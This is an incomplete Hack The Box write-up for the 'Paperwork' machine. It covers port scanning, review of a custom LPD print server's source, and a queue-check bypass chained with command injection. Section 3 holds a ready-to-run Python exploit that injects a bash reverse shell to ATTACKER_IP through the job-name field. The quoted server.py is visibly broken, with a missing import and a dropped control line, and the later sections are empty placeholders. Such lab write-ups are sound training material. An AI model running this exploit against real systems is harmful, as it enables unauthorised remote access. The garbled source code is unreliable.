---
link: https://app.hackthebox.com/machines/Paperwork?sort_by=created_at&sort_type=desc
description: Easy·Linux
release date: 2026-07-11
tags:
  - SN_11
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1ee24ec-e2f1-4c61-88ca-9d7d4d296251-1780441937.png
solved:
solve date:
machine no.: 8
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">"Machine Name" Writeup</p></div>

  <img src="badge link" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): "htb username"</p>
    <p style="margin: 0;">Difficulty: Easy/Medium/Hard/Insane</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `ping`
    - **Description:** Sends ICMP echo-request packets and reports replies and round-trip times.
    - **Purpose:** Confirm the target host is alive and routable over the VPN tunnel before committing to a full port scan.
- `-c 4`
    - **Description:** Count — stop after sending four packets rather than pinging indefinitely.
    - **Purpose:** A quick liveness check; four packets is enough to confirm reachability and see a stable round-trip time.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ ping -c 4 10.129.35.97                                          
PING 10.129.35.97 (10.129.35.97) 56(84) bytes of data.
64 bytes from 10.129.35.97: icmp_seq=1 ttl=63 time=215 ms
64 bytes from 10.129.35.97: icmp_seq=2 ttl=63 time=489 ms
64 bytes from 10.129.35.97: icmp_seq=3 ttl=63 time=215 ms
64 bytes from 10.129.35.97: icmp_seq=4 ttl=63 time=215 ms

--- 10.129.35.97 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 214.660/283.254/488.550/118.527 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.
- `| grapo`
	- **Description:** Custom shell function (defined in `~/.zshrc`) that echoes the full scan to the terminal via `tee /dev/tty`, then extracts open-port numbers and prints them as a comma-joined list.
	- **Purpose:** Produces a ready-to-copy port string (`22,80,1515`) to feed straight into the targeted deep scan, without hand-copying from the report.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ nmap -p- --min-rate 5000 -Pn 10.129.35.97 | grapo
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-18 14:15 +0000
Warning: 10.129.35.97 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.35.97
Host is up (0.24s latency).
Not shown: 65306 closed tcp ports (reset), 226 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol

Nmap done: 1 IP address (1 host up) scanned in 49.20 seconds

22,80,1515
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ nmap -A -p 22,80,1515 10.129.35.97               
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-18 14:29 +0000
Nmap scan report for 10.129.35.97
Host is up (0.23s latency).

PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
|_http-server-header: nginx/1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
| fingerprint-strings: 
|   TerminalServer, TerminalServerCookie: 
|_    Archive_Printer is ready and printing.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.98%I=7%D=7/18%Time=6A5B8DDB%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printin
SF:g\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   237.45 ms 10.10.14.1
2   237.82 ms 10.129.35.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.47 seconds
```

SSH is OpenSSH 10.0p2 on Ubuntu — modern, patched, not our way in. The web server on 80 is nginx 1.28.0, and notice it redirects to `http://paperwork.htb/` — that's a virtual host, so we'll need that hostname in `/etc/hosts` before the site resolves properly. The star of the show is 1515: Nmap can't fingerprint it (`ifor-protocol?` with a `?`), but it coughed up a banner — `Archive_Printer is ready and printing.` That "printer" language is the tell. This is the custom LPD service, and Nmap has no signature for it precisely because it's bespoke. That unrecognized-but-talking service is exactly where this box wants us to dig.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port     | Service                   | Version                                          | Analysis                                                                                                                                            |
| -------- | ------------------------- | ------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22/tcp   | SSH                       | OpenSSH 10.0p2 (Ubuntu 5ubuntu5.4)               | Current, fully patched. No known exploit; useful only later, once we have credentials or a written SSH key.                                         |
| 80/tcp   | HTTP                      | nginx 1.28.0 (Ubuntu)                            | Redirects to vhost `paperwork.htb`. Server itself is current; interest is in the _application_, not the nginx version. Requires `/etc/hosts` entry. |
| 1515/tcp | Custom LPD (unrecognized) | banner: `Archive_Printer is ready and printing.` | **Primary target.** Bespoke printer daemon with no Nmap signature — hand-rolled code is where logic-flaw bugs live. This is the intended foothold.  |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Service / Web Enumeration
#### 2.2.1 Virtual Host Resolution

**Command:** `echo "TARGET_IP paperwork.htb" | sudo tee -a /etc/hosts`

**Breakdown:**

- `sudo tee -a /etc/hosts`
    - **Description:** `tee -a` appends its stdin to a file; `sudo` grants the write permission `/etc/hosts` requires.
    - **Purpose:** Map the vhost `paperwork.htb` to the target IP locally, since port 80 redirects to that hostname and won't serve content when requested by IP.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ echo "10.129.35.97 paperwork.htb" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.35.97 paperwork.htb

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ ping -c1 paperwork.htb
PING paperwork.htb (10.129.35.97) 56(84) bytes of data.
64 bytes from paperwork.htb (10.129.35.97): icmp_seq=1 ttl=63 time=220 ms

--- paperwork.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 219.602/219.602/219.602/0.000 ms
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.2 Web Application Review — Intake Portal

**Action:** Browse to `http://paperwork.htb/` and review the Intake Portal page.

**Result:**

![[paperwork.htb.png]]

**Key finding:** The web app is not itself the target — it's documentation for the service on port 1515. It confirms three things: the protocol is **RFC 1179 (LPD)**, the queue name is **`archive_intake`**, and the backend is a **custom processor** (`paperwork-archive-v1.02`). The Usage Notice implies print jobs carry a parsed "identifier" field — a likely injection point.

|Attribute|Value|Attack implication|
|---|---|---|
|Protocol|RFC 1179 (LPD)|Port 1515 speaks the Line Printer Daemon protocol — jobs are submitted as raw LPD control/data files, not HTTP. We'll need to craft the protocol by hand.|
|Target Queue|`archive_intake`|The queue name the server validates against. Relevant if queue-name checking can be bypassed or abused.|
|Internal Processor|`paperwork-archive-v1.02`|Custom, non-standard backend. Hand-rolled parsing/execution is where logic flaws (injection, auth bypass) tend to live.|
|Identifier requirement|"valid identifier" required|Jobs carry a parsed identifier (job name). A parsed, client-controlled field is a candidate injection point.|

**Theory block — RFC 1179 / LPD:** LPD is an old printing protocol. A client connects to TCP 515 (here relocated to 1515), names a print queue, then sends two files: a _control file_ (metadata — job name, user, host) and a _data file_ (the content to print). The server parses the control file field by field. Because this is a _custom_ LPD reimplementation rather than a standard daemon, the way it parses those control-file fields — especially the job identifier — is exactly what we'll scrutinize for flaws.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.3 Source Code Acquisition

**Action:** Click on the `paperwork-archive-v1.02` link on the Intake Portal page. It downloads `paperwork-archive-v1.02.zip`, which contains the server source.

**Command:** `unzip paperwork-archive-v1.02.zip && cat server.py`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ ls
paperwork-archive-v1.02.zip

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ unzip paperwork-archive-v1.02.zip 
Archive:  paperwork-archive-v1.02.zip
  inflating: server.py               

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ ls
paperwork-archive-v1.02.zip  server.py

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ cat server.py  
import socket
import threading
import subprocess
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            
            command = data[0]
            
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
                
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            
            subcommand = chunk[0]
            self.sock.send(b'\x00') 
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue
                
                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)
                
                decoded_content = content.decode(errors='ignore')
                
                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break
                
                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
                
                self.sock.send(b'\x00') 
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.4 Vulnerability Research & Analysis

Source review of `server.py` identifies two chained vulnerabilities in `handle_print_job()`.

**Vulnerability 1 — Authentication bypass via substring comparison (queue check)**

```python
queue = data[1:].decode().strip()
if queue not in VALID_QUEUE:      # VALID_QUEUE == "archive_intake"
    self.sock.send(b'\x01')
    return
```

The check uses Python's `in` (substring test) instead of `==` (equality). Because an empty string is a substring of any string, `"" in "archive_intake"` evaluates to `True`. Sending an empty queue name makes `queue not in VALID_QUEUE` false, skipping the rejection and granting access to the job handler.

|Aspect|Detail|
|---|---|
|Intended check|`queue == "archive_intake"` (exact match)|
|Actual check|`queue in "archive_intake"` (substring)|
|Bypass input|empty string (`""`) — substring of everything|
|Effect|Any client reaches the print-job handler unauthenticated|

**Vulnerability 2 — Command injection via `job_name` (shell sink)**

```python
job_name = line[1:]     # client-supplied, from the control file 'J' line
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

The client-controlled `job_name` is interpolated directly into a shell command run with `shell=True`, with no sanitization. Shell metacharacters in `job_name` are interpreted by `/bin/sh`, allowing arbitrary command execution as the service user (`lp`).

**Theory block — taint tracking (source → sink):** To find injection bugs, trace attacker-controlled input (the _source_) through the program to any dangerous function (the _sink_). Here the source is `job_name` (sent by the client in the control file) and the sink is `subprocess.Popen(..., shell=True)`. With `shell=True`, Python passes the whole string to `/bin/sh`, so characters like `'`, `;`, and `#` are executed as syntax rather than treated as text. No sanitization sits between source and sink, so the input reaches the shell intact — the definition of a command-injection vulnerability. The planned payload breaks out of the `echo '...'` string with a quote, runs a command, and comments out the trailing redirect with `#`.

**Key finding:** The two flaws chain: the substring bug provides unauthenticated access to the job handler, and the `job_name` command injection provides code execution once inside. Together they yield a remote shell as `lp` with no credentials required.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation — Initial Access
### 3.1 Exploit Acquisition and Preparation

```python
import socket
import time

TARGET = "10.129.35.97"
PORT = 1515
ATTACKER_IP = "10.10.15.111"
ATTACKER_PORT = 4444

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))

    # 1. Command 2 (print job) + empty queue name -> bypasses the substring check
    s.send(b"\x02\n")
    time.sleep(0.2)

    # 2. Build the malicious job_name (THIS is the injection — see below)
    cmd = f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'"
    job_name = f"'; {cmd}; #"

    # 3. LPD control file: the 'J' line carries the job name the server executes
    control_file = f"H attacker\nP user\nJ{job_name}\n".encode()

    # 4. Subcommand header: \x02 + "<size> cfA001attacker\n"
    header = bytes([0x02]) + f"{len(control_file)} cfA001attacker\n".encode()
    s.send(header)
    s.recv(1)  # ACK

    # 5. Send the control file body -> triggers the injected command
    s.send(control_file)

    try:
        s.recv(2)
    except socket.timeout:
        pass
    s.close()
    print("[+] Exploit sent. Check your listener!")

if __name__ == "__main__":
    main()
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

